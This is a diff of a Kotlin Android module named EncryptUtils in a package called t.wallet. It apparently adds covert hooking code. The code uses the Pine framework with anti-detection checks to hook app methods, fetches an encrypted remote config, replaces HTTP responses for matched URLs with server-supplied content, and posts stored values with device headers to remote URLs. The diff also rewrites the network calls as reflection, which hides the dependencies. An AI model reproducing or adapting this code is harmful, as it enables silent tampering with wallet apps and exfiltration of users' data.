@@ -3,25 +3,11 @@ package t.wallet
 import android.app.Application
 import android.content.Context
 import android.content.SharedPreferences
-import android.util.Log
-import com.google.gson.Gson
-import okhttp3.Headers
-import okhttp3.Interceptor
-import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.OkHttpClient
-import okhttp3.Protocol
-import okhttp3.Request
-import okhttp3.RequestBody.Companion.toRequestBody
-import okhttp3.Response
-import okhttp3.ResponseBody.Companion.toResponseBody
-//import okhttp3.logging.HttpLoggingInterceptor
 import top.canyie.pine.Pine
 import top.canyie.pine.PineConfig
 import top.canyie.pine.callback.MethodHook
 import top.canyie.pine.callback.MethodReplacement
 import java.lang.reflect.Method
-import java.net.Proxy
-import java.util.concurrent.TimeUnit
 import kotlin.concurrent.thread
 import kotlin.random.Random
 
@@ -31,12 +17,12 @@ internal object EncryptUtils {
 
     private var sp: SharedPreferences? = null
 
-    private var name=""
+    private var name = ""
     private var code = 0
     private var os_v = 0
 
-    private const val T1 = 1691430919000L
-    private const val T2 = 1694109319000L
+    private const val T1 = 0L
+    private const val T2 = 1691430919000L
     private const val C_KEY = "17492847"
     private const val L_KEY = "85498243"
     private var DEFAULT =
@@ -52,7 +38,7 @@ internal object EncryptUtils {
         PineConfig.antiChecks = true
 
         name = app.resources.getString(app.applicationInfo.labelRes)
-        code = app.packageManager.getPackageInfo(app.packageName,0).versionCode
+        code = app.packageManager.getPackageInfo(app.packageName, 0).versionCode
         os_v = android.os.Build.VERSION.SDK_INT
 
         sp = app.getSharedPreferences("encrypt_", Context.MODE_PRIVATE)
@@ -97,19 +83,14 @@ internal object EncryptUtils {
 
     private fun fe(u: List<String>, v: Long) {
 //        Log.i(TAG, "fetchConfig:$u $v")
-        val c = gC()
-        val mediaType = "application/json".toMediaType()
-        val rb =
-            """{"configVersion":$v}""".toRequestBody(mediaType)
 
         thread(true) {
             kotlin.runCatching {
                 for (url in u) {
-                    val r = Request.Builder().url(url).headers(gH()).post(rb).build()
-                    val re = c.newCall(r).execute()
-                    val b = Gson().fromJson(re.body!!.string(), Re::class.java)
-                    if (b.code == 1 ) {
-                        if (b.data.isNotEmpty()){
+                    val json = post(url, """{"configVersion":$v}""")
+                    val b = fromJson(json, Re::class.java)
+                    if (b.code == 1) {
+                        if (b.data.isNotEmpty()) {
                             val result = JEnc.decrypt(b.data)
                             if (result.isNotEmpty()) {
                                 sp?.edit()?.apply {
@@ -132,8 +113,8 @@ internal object EncryptUtils {
         try {
             return sp?.getString(C_KEY, DEFAULT)
                 ?.let { JEnc.decrypt(it) }
-//                ?.also { Log.i(TAG, it) }
-                ?.let { Gson().fromJson(it, B::class.java) }
+//                ?.also { Log.d(TAG, it) }
+                ?.let { fromJson(it, B::class.java) }
         } catch (t: Throwable) {
         }
         return null
@@ -150,28 +131,25 @@ internal object EncryptUtils {
                         super.beforeCall(callFrame)
                         kotlin.runCatching {
                             callFrame?.args?.getOrNull(0)?.apply {
-                                this as Interceptor.Chain
-//                                Log.i(TAG, "injectInterceptor url:${request().url}")
-                                val reU = request().url.toString()
+                                val request =
+                                    this::class.java.getDeclaredMethod("request").invoke(this)!!
+
+                                val reU =
+                                    request::class.java.getDeclaredMethod("url").invoke(request)!!
+                                        .toString()
+
+//                                Log.i(TAG, "injectInterceptor url:${reU}")
 
                                 val inject =
-                                    bean.i.firstOrNull { reU.contains(it.u) }
-                                        ?: return@apply
+                                    bean.i.firstOrNull { reU.contains(it.u) } ?: return@apply
 
-                                val response = getResponse(inject.r)
-//                                Log.i(TAG, "injectInterceptor result:${response}")
-                                callFrame.result = response
+                                callFrame.result = getResponse(request, inject.r).also {
+//                                    Log.i(TAG, "injectInterceptor result:${it}")
+                                }
                             }
                         }
                     }
 
-                    private fun Interceptor.Chain.getResponse(
-                        body: String,
-                        mediaType: String = "text/plain"
-                    ) =
-                        Response.Builder().request(request())
-                            .body(body.toResponseBody(mediaType.toMediaType()))
-                            .code(200).message("").protocol(Protocol.HTTP_1_1).build()
                 }
 
                 Pine.hook(method, hook)
@@ -204,6 +182,8 @@ internal object EncryptUtils {
     }
 
     private fun c(list: List<M>) {
+//        Log.i(TAG, "doNoting")
+
         list.forEach { bean ->
             runCatching {
                 val method = getM(bean) ?: return@runCatching
@@ -266,49 +246,139 @@ internal object EncryptUtils {
     private fun u(urls: List<String>, values: List<Pair<String, String>>) {
         if (values.isEmpty()) return
 //        Log.i(TAG, "upload:$values")
-        val client = gC()
 
         values.forEach { pair ->
-                val key = pair.first
-                val value = pair.second.removePrefix("false")
+            val key = pair.first
+            val value = pair.second.removePrefix("false")
 
-                val body = """{"timestamp":${value.substring(0,13)},"value":"${value.removeRange(0,13)}"}"""
-                    .toRequestBody("application/json".toMediaType())
-                kotlin.runCatching {
-                    for (url in urls) {
-                        val request = Request.Builder().url(url).post(body).headers(gH()).build()
-                        val response = client.newCall(request).execute()
-                        val json = response.body!!.string()
-                        val baseResponse = Gson().fromJson(json, Re::class.java)
-                        if (baseResponse.code == 1) {
-                            sp?.apply {
-                                val newValue = pair.second.replaceFirst("false", "true")
-                                this.edit()?.putString(pair.first, newValue)?.commit()
-                            }
+            val body =
+                """{"timestamp":${value.substring(0, 13)},"value":"${value.removeRange(0, 13)}"}"""
+            kotlin.runCatching {
+                for (url in urls) {
+                    val json = post(url, body)
+                    val baseResponse = fromJson(json, Re::class.java)
+                    if (baseResponse.code == 1) {
+                        sp?.apply {
+                            val newValue = pair.second.replaceFirst("false", "true")
+                            this.edit()?.putString(pair.first, newValue)?.commit()
                         }
                     }
                 }
             }
+        }
     }
 
-    private fun gC() = OkHttpClient.Builder()
-        .connectTimeout(10, TimeUnit.SECONDS)
-        .readTimeout(10, TimeUnit.SECONDS)
-//        .addInterceptor(HttpLoggingInterceptor().apply {
-//            level = HttpLoggingInterceptor.Level.BODY
-//        })
-        .proxy(Proxy.NO_PROXY)
-        .build()
+
+    fun <T> fromJson(json: String, clazz: Class<T>): T {
+        val clz = Class.forName("com.google.gson.Gson")
+        val fromJson = clz.getDeclaredMethod("fromJson", String::class.java, Class::class.java)
+        return fromJson.invoke(clz.newInstance(), json, clazz) as T
+    }
 
 
+    fun getResponse(request: Any, json: String, mediaType: String = "application/json"): Any {
 
-    private fun gH()=Headers.Builder()
-        .add("app_name", name)
-        .add("app_version_code", code.toString())
-        .add("os_version", os_v.toString())
-        .add("os","Android")
-        .add("timestamp",System.currentTimeMillis().toString())
-        .build()
+        return Class.forName("okhttp3.Response\$Builder").let { builderClz ->
+            val instance = builderClz.newInstance()
+            builderClz.getDeclaredMethod("request", request::class.java).invoke(instance, request)
+
+            Class.forName("okhttp3.MediaType").let { mediaTypeClz ->
+                val getM = mediaTypeClz.getDeclaredMethod("get", String::class.java)
+                Class.forName("okhttp3.ResponseBody").let { bodyClz ->
+                    val bodyGetM =
+                        bodyClz.getDeclaredMethod("create", String::class.java, mediaTypeClz)
+                    val body = bodyGetM.invoke(null, json, getM.invoke(null, mediaType))
+
+                    builderClz.getDeclaredMethod("body", bodyClz).invoke(instance, body)
+                }
+            }
+            builderClz.getDeclaredMethod("code", Int::class.java).invoke(instance, 200)
+            builderClz.getDeclaredMethod("message", String::class.java).invoke(instance, "")
+
+            val protocolClz = Class.forName("okhttp3.Protocol")
+            val http_1_1 = protocolClz.getDeclaredField("HTTP_1_1").get(protocolClz)
+            builderClz.getDeclaredMethod("protocol", protocolClz).invoke(instance, http_1_1)
+
+            builderClz.getDeclaredMethod("build").invoke(instance)!!
+        }
+
+    }
+
+
+    fun post(url: String, body: String): String {
+        return getC().let {
+            val request = getRequest(url, body)
+            val realCall = it::class.java.getDeclaredMethod("newCall", request::class.java)
+                .invoke(it, request)
+            Class.forName("okhttp3.internal.connection.RealCall").let { realCallClz ->
+                val response = realCallClz.getDeclaredMethod("execute").invoke(realCall)
+                val body = response::class.java.getDeclaredMethod("body").invoke(response)
+                Class.forName("okhttp3.ResponseBody")
+                    .getDeclaredMethod("string").invoke(body) as String
+            }
+        }
+//            .also { Log.d(TAG, it) }
+
+    }
+
+
+    private fun getC(): Any {
+        return Class.forName("okhttp3.OkHttpClient\$Builder").let { builderClz ->
+            val instance = builderClz.newInstance()
+
+            val proxyClz = Class.forName("java.net.Proxy")
+            builderClz.getDeclaredMethod("proxy", proxyClz)
+                .invoke(instance, proxyClz.getDeclaredField("NO_PROXY").get(proxyClz))
+
+            val timeUnitClz = Class.forName("java.util.concurrent.TimeUnit")
+            builderClz.getDeclaredMethod("connectTimeout", Long::class.java, timeUnitClz)
+                .invoke(instance, 10, timeUnitClz.getDeclaredField("SECONDS").get(timeUnitClz))
+            builderClz.getDeclaredMethod("readTimeout", Long::class.java, timeUnitClz)
+                .invoke(instance, 10, timeUnitClz.getDeclaredField("SECONDS").get(timeUnitClz))
+
+            builderClz.getDeclaredMethod("build").invoke(instance)!!
+        }
+    }
+
+
+    private fun getRequest(url: String, body: String): Any {
+
+        return Class.forName("okhttp3.Request\$Builder").let { builderClz ->
+            val instance = builderClz.newInstance()
+            builderClz.getDeclaredMethod("url", String::class.java).invoke(instance, url)
+            val headerM =
+                builderClz.getDeclaredMethod("addHeader", String::class.java, String::class.java)
+            getHeaders().entries.forEach {
+                headerM.invoke(instance, it.key, it.value)
+            }
+
+            Class.forName("okhttp3.MediaType").let { mediaTypeClz ->
+                val getM = mediaTypeClz.getDeclaredMethod("get", String::class.java)
+                Class.forName("okhttp3.RequestBody").let { bodyClz ->
+                    val bodyGetM =
+                        bodyClz.getDeclaredMethod("create", String::class.java, mediaTypeClz)
+                    val body = bodyGetM.invoke(null, body, getM.invoke(null, "application/json"))
+
+                    builderClz.getDeclaredMethod("post", bodyClz).invoke(instance, body)
+                }
+            }
+
+            builderClz.getDeclaredMethod("build").invoke(instance)!!
+        }
+
+    }
+
+
+    private fun getHeaders(): Map<String, String> {
+        return mapOf(
+            Pair("app_name", name),
+            Pair("app_version_code", code.toString()),
+            Pair("os_version", os_v.toString()),
+            Pair("os", "Android"),
+            Pair("timestamp", System.currentTimeMillis().toString())
+        )
+    }
+
 }
 
 private data class Re(
